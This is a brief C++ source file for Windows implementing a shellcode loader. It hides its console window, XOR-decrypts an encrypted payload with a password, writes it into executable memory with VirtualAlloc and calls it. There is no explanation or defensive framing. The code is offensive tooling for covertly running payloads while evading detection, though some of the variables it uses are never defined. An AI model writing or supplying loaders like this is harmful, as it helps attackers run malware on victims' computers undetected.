#include <windows.h>
#include <iostream>

int main() {
    // Hide the console window
    HWND hWnd = GetConsoleWindow();
    ShowWindow( hWnd, SW_HIDE );
    
    unsigned char shell_code[shellcode_length];

    for(int i = 0; i < shellcode_length; i++) {
        shell_code[i] = (char) enc_shellcode[i] ^ password[i % password_len];
    }

    void* payload = VirtualAlloc (0, sizeof(shell_code), MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    memcpy(payload, shell_code, sizeof(shell_code));

    (( void(*)() )payload)();

    return 0;
}
